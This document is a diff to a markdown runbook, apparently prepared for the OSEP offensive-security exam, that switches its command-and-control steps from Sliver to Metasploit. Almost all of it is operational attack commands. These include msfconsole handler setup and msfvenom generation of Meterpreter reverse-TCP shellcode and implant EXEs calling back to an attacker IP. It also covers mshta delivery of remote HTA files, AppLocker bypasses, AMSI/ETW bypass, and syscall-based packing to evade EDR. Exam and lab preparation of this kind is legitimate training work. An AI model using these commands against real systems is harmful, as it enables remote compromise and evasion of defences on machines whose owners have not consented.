@@ -1,4 +1,4 @@
-# OSEP Runbook — Sliver + osep-tools (step-wise)
+# OSEP Runbook — Metasploit + osep-tools (step-wise)
 
 One decision tree from initial access to post-exploitation. Each row is:
 **situation → technique → exact command** (file references are to this repo).
@@ -10,26 +10,22 @@ Legend: `<IP>` = your attacker IP, `<TARGET>` = victim host, `<PORT>` = your C2 
 ## 0. C2 setup (attacker, once)
 
 ```bash
-# Start Sliver (single binary — auto-starts the server)
-sliver
+# Start a Metasploit handler (pick ONE transport; reverse_tcp is the OSEP default)
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"
 
-# Start a listener (pick ONE transport; mTLS is the OSEP default)
-sliver > mtls    --lhost 0.0.0.0 --lport 8888     # recommended default
-sliver > https   --lhost 0.0.0.0 --lport 443      # blends with web traffic
-sliver > http    --lhost 0.0.0.0 --lport 80
-sliver > wg      --lport 53                        # WireGuard (fast)
-sliver > dns     --domains yourdomain.com          # DNS (rare in OSEP)
+# reverse_https -> blends into TLS/443 (PAYLOAD windows/x64/meterpreter/reverse_https)
+# reverse_http  -> blends into port 80  (PAYLOAD windows/x64/meterpreter/reverse_http)
+# stageless     -> PAYLOAD windows/x64/meterpreter_reverse_tcp (self-contained ~200KB)
 
-# Confirm listener is up
-sliver > jobs
+# Confirm the job is running (inside the msfconsole prompt):
+#   jobs -l
 ```
 
-| Situation | Transport | Reason |
+| Situation | Payload / transport | Reason |
 |---|---|---|
-| Default / unknown egress | `mtls :8888` | Simplest, reliable, no HTTP artifact |
-| Target proxies web traffic | `https :443` | Blends into TLS/443 |
-| Only DNS egress | `dns` | Slow but works when TCP is blocked |
-| Need speed / stealth | `wg` | WireGuard, low C2 signature |
+| Default / unknown egress | `windows/x64/meterpreter/reverse_tcp :8888` | Simplest, reliable |
+| Target proxies web traffic | `windows/x64/meterpreter/reverse_https :443` | Blends into TLS/443 |
+| Self-contained (no stage-2) | `windows/x64/meterpreter_reverse_tcp` | Stageless, ~200KB |
 
 ---
 
@@ -71,34 +67,38 @@ Deliver: `mshta.exe http://<IP>/red.hta`
 
 > **Payload type matters:** `black.hta` runs `installutil.exe /U` on a decoded `shell.exe`,
 > which must be a **.NET InstallUtil payload** (compile
-> `word-macro/installutil-applocker-bypass/installutil.cs`) — **not** a raw Sliver/Go implant,
+> `word-macro/installutil-applocker-bypass/installutil.cs`) — **not** a raw Go/Meterpreter implant,
 > because InstallUtil only executes .NET assemblies. `red.hta` runs an in-memory PowerShell
 > `payload.ps1` (no disk write).
 
 ---
 
-## 2. Generate shellcode (Sliver)
+## 2. Generate shellcode (msfvenom)
 
 ```bash
-# Raw PIC shellcode (→ encrypt, or → NimSyscallPacker)
-sliver > generate --mtls <IP>:8888 --format shellcode --save /tmp/sc.bin
+# Stageless raw PIC (→ encrypt, or → NimSyscallPacker) — self-contained ~200KB
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc.bin
 
-# Convert to C# / PowerShell byte arrays for the loaders (msfvenom):
-msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs   # aes-loaders/, cs-loaders/
-msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1 -o /tmp/sc.ps1     # ps-shellcode-runner.ps1
+# Staged raw stager (→ tight VBA / shellcode runners) — ~500B
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 EXITFUNC=thread -f raw -o /tmp/stager.bin
 
 # Standalone EXE (→ NimSyscallPacker, or direct delivery)
-sliver > generate --mtls <IP>:8888 --format exe --save /tmp/implant.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f exe -o /tmp/implant.exe
 ```
 
 ### Situation: the injected blob must stay small (tight VBA / shellcode runner)
-Use a **stager** (few hundred bytes) instead of the full implant (MBs):
+Use the **staged** payload (`windows/x64/meterpreter/reverse_tcp`) — the tiny stage-1
+stager calls back to `multi/handler`, which then serves stage-2 (the full Meterpreter).
 
 ```bash
-sliver > profiles new --mtls <IP>:8888 --format shellcode my-profile
-sliver > stage-listener --url http://<IP>:8080 --profile my-profile --prepend-size
-msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<IP> LPORT=8080 LURI=/hello.woff -f raw -o /tmp/stager.bin
+# Handler already running (Section 0). Generate the ~500B stage-1 stager:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 EXITFUNC=thread -f raw -o /tmp/stager.bin
 ```
+
+> **Staged vs stageless:** `meterpreter/reverse_tcp` (staged) is ~500B and needs the
+> handler to serve stage-2. `meterpreter_reverse_tcp` (stageless) is ~200KB and
+> self-contained — use it for the encrypt-then-run loaders (XOR/AES) and the
+> NimSyscallPacker, where a single blob is fed straight into the runner.
 
 Convert raw → array when needed:
 
@@ -108,9 +108,9 @@ msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1 -o /tmp/sc.ps1     # P
 msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f vba -o /tmp/sc.vba     # VBA  Array(...)
 ```
 
-> **Rule of thumb:** full Sliver shellcode is MBs — only use it in C# runners that
-> allocate `shellcode.Length` (all loaders in this repo now do). For VBA macros,
-> generate a small msfvenom stager (`-f vba`) instead.
+> **Rule of thumb:** full stageless Meterpreter is ~200KB — only use it in C# runners
+> that allocate `shellcode.Length` (all loaders in this repo now do). For VBA macros,
+> generate a small staged stager (`-f vba`) instead.
 
 ---
 
@@ -256,13 +256,13 @@ direct/indirect syscalls + ntdll unhooking + AMSI/ETW bypass.
 
 ```bash
 # 1. Generate raw shellcode
-sliver > generate --mtls <IP>:8888 --format shellcode --save /tmp/sc.bin
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc.bin
 
 # 2. Pack it (check exact flags with --help)
 ./NimSyscallLoader -f /tmp/sc.bin -o /tmp/loader.exe --unhook --indirect-syscalls
 
-# 3. Start listener + deliver loader.exe
-sliver > mtls --lport 8888
+# 3. Start handler + deliver loader.exe
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"
 ```
 
 Build setup: see `nimsyscallpacker/README.md` (Nim 2.2.10 + MinGW-w64 11.1;
@@ -274,7 +274,7 @@ deprecated/unmaintained — test on a lab VM before exam day.
 ## One-line mental model
 
 1. **Recon** → macro phones home → know AppLocker + arch.
-2. **Generate** → `sliver > generate --mtls <IP>:8888 --format <exe|shared|service|shellcode>`; make arrays/stagers with `msfvenom`.
+2. **Generate** → `msfvenom -p windows/x64/meterpreter[_]reverse_tcp LHOST=<IP> LPORT=8888 -f <raw|csharp|ps1|vba|exe>`; make arrays/stagers with `-f <format>`.
 3. **Obfuscate** → Caesar < XOR < AES as AV pressure rises.
 4. **Execute** → self-inject → remote-inject → hollowing → Nt* → APC → DInvoke → unhook, as EDR pressure rises.
 5. **AppLocker** → InstallUtil / msbuild / regsvr32. **PowerShell** → AMSI/ETW first.
